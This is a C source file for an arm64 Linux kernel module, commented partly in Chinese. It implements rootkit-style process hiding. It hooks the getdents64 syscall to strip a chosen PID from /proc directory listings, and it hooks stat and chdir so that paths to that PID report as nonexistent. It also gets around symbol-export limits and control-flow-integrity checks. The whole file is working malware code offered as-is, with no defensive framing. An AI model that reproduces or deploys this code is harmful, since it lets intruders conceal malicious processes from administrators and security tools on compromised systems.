#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/ptrace.h>

extern int target_hide_pid;

#define UNTAG_ADDR(addr) ((addr) & 0x00ffffffffffffffUL)

#if !defined(__nocfi)
#define __nocfi __attribute__((no_sanitize("cfi")))
#endif

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef long (*copy_from_user_nofault_t)(void *dst, const void __user *src, size_t size);
typedef long (*copy_to_user_nofault_t)(void __user *dst, const void *src, size_t size);

static kallsyms_lookup_name_t p_kallsyms_lookup_name = NULL;
static copy_from_user_nofault_t p_copy_from_user_nofault = NULL;
static copy_to_user_nofault_t p_copy_to_user_nofault = NULL;

struct gd_data {
    void __user *d;
    int pid;        /* entry 时快照 */
};

struct path_data {
    int hit;
    int pid;        /* entry 时快照 */
};

static unsigned long get_kallsyms_addr(void) {
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    unsigned long addr;
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static int __nocfi safe_get_path_string(char *dst, unsigned long user_addr, size_t max_len) {
    long ret;
    void __user *ptr = (void __user *)UNTAG_ADDR(user_addr);
    if (!p_copy_from_user_nofault) return -1;
    ret = p_copy_from_user_nofault(dst, ptr, max_len);
    if (ret != 0) return -1;
    dst[max_len - 1] = '\0';
    return 0;
}

static int is_target_path_pid(const char *path, int pid) {
    char target[32];
    int len;

    if (pid <= 0) return 0;

    snprintf(target, sizeof(target), "/proc/%d", pid);
    len = strlen(target);

    if (strncmp(path, target, len) != 0) return 0;
    if (path[len] == '\0' || path[len] == '/') return 1;
    return 0;
}

/* --- getdents64 hook --- */

static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct gd_data *d = (void *)ri->data;
    struct pt_regs *user_regs;
    unsigned long x1;

    /* 快照 PID，整个生命周期只用这一份 */
    d->pid = READ_ONCE(target_hide_pid);

    if (regs->regs[0] > 0xffffff0000000000UL) {
        user_regs = (struct pt_regs *)regs->regs[0];
        x1 = user_regs->regs[1];
    } else {
        x1 = regs->regs[1];
    }
    d->d = (void __user *)UNTAG_ADDR(x1);
    return 0;
}

static int __nocfi gd_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct gd_data *d = (void *)ri->data;
    struct linux_dirent64 *b, *e;
    char s[16];
    long r, o;
    int pid = d->pid;   /* 使用快照值 */

    r = regs->regs[0];
    if (pid <= 0 || r <= 0) return 0;

    snprintf(s, sizeof(s), "%d", pid);

    b = kvmalloc(r, GFP_KERNEL);
    if (!b) return 0;

    if (p_copy_from_user_nofault(b, d->d, r) != 0)
        goto out;

    for (o = 0; o < r; ) {
        e = (void *)b + o;

        /* 安全检查：d_reclen 不能为 0，也不能超过剩余长度 */
        if (e->d_reclen == 0 || e->d_reclen > (unsigned short)(r - o))
            break;

        if (!strcmp(e->d_name, s)) {
            long remaining = r - o - e->d_reclen;
            if (remaining > 0)
                memmove(e, (char *)e + e->d_reclen, remaining);
            r -= e->d_reclen;
            /* 不移动 o，因为新条目移到了当前位置 */
        } else {
            o += e->d_reclen;
        }
    }

    if (p_copy_to_user_nofault(d->d, b, r) == 0)
        regs->regs[0] = r;

out:
    kvfree(b);
    return 0;
}

/* --- path hooks (stat & chdir) --- */

static int stat_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct path_data *d = (void *)ri->data;
    struct pt_regs *user_regs;
    unsigned long ptr;
    char path[64];

    d->hit = 0;
    d->pid = READ_ONCE(target_hide_pid);

    if (d->pid <= 0) return 0;

    if (regs->regs[0] > 0xffffff0000000000UL) {
        user_regs = (struct pt_regs *)regs->regs[0];
        ptr = user_regs->regs[1]; /* Arg1 */
    } else {
        ptr = regs->regs[1];
    }

    if (safe_get_path_string(path, ptr, sizeof(path)) == 0) {
        if (is_target_path_pid(path, d->pid))
            d->hit = 1;
    }
    return 0;
}

static int chdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct path_data *d = (void *)ri->data;
    struct pt_regs *user_regs;
    unsigned long ptr;
    char path[64];

    d->hit = 0;
    d->pid = READ_ONCE(target_hide_pid);

    if (d->pid <= 0) return 0;

    if (regs->regs[0] > 0xffffff0000000000UL) {
        user_regs = (struct pt_regs *)regs->regs[0];
        ptr = user_regs->regs[0]; /* Arg0 */
    } else {
        ptr = regs->regs[0];
    }

    if (safe_get_path_string(path, ptr, sizeof(path)) == 0) {
        if (is_target_path_pid(path, d->pid))
            d->hit = 1;
    }
    return 0;
}

static int path_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct path_data *d = (void *)ri->data;
    if (d->hit)
        regs->regs[0] = -ENOENT;
    return 0;
}

/* --- kretprobe 定义 --- */

static struct kretprobe krp_gd = {
    .handler = gd_ret,
    .entry_handler = gd_entry,
    .data_size = sizeof(struct gd_data),
    .maxactive = 20,
    .kp.symbol_name = "__arm64_sys_getdents64",
};

static struct kretprobe krp_stat = {
    .handler = path_ret,
    .entry_handler = stat_entry,
    .data_size = sizeof(struct path_data),
    .maxactive = 20,
    .kp.symbol_name = "__arm64_sys_newfstatat",
};

static struct kretprobe krp_chdir = {
    .handler = path_ret,
    .entry_handler = chdir_entry,
    .data_size = sizeof(struct path_data),
    .maxactive = 5,
    .kp.symbol_name = "__arm64_sys_chdir",
};

static int __nocfi setup_hook(void) {
    unsigned long addr = get_kallsyms_addr();
    if (!addr) return -1;
    p_kallsyms_lookup_name = (kallsyms_lookup_name_t)addr;
    p_copy_from_user_nofault = (copy_from_user_nofault_t)p_kallsyms_lookup_name("copy_from_user_nofault");
    p_copy_to_user_nofault = (copy_to_user_nofault_t)p_kallsyms_lookup_name("copy_to_user_nofault");
    if (!p_copy_from_user_nofault) return -1;
    register_kretprobe(&krp_gd);
    register_kretprobe(&krp_stat);
    register_kretprobe(&krp_chdir);
    return 0;
}

static void uninstall_hook(void) {
    unregister_kretprobe(&krp_gd);
    unregister_kretprobe(&krp_stat);
    unregister_kretprobe(&krp_chdir);
}
